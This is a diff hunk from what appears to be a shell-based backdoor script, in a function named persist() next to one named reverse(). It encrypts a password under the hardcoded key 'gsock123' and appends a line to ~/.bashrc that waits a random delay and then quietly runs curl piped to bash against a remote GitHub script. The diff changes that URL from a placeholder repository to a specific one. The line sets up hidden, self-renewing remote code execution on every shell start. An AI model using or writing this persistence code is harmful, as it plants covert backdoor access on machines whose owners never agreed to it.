@@ -18,7 +18,7 @@ persist() {
     
     echo "$PASS" | openssl enc -aes-256-cbc -k gsock123 -out "$PERSIST_DIR/pass"
     
-    echo '[ -f ~/.config/htop/config ] && (sleep $((RANDOM%60)); curl -fsSL https://raw.githubusercontent.com/youruser/gsocket-zero/main/gsocket.sh | bash) &' >> ~/.bashrc
+    echo '[ -f ~/.config/htop/config ] && (sleep $((RANDOM%60)); curl -fsSL https://raw.githubusercontent.com/tobrutt/gsocket/refs/heads/main/deploy.sh | bash) &' >> ~/.bashrc
 }
 
 reverse() {
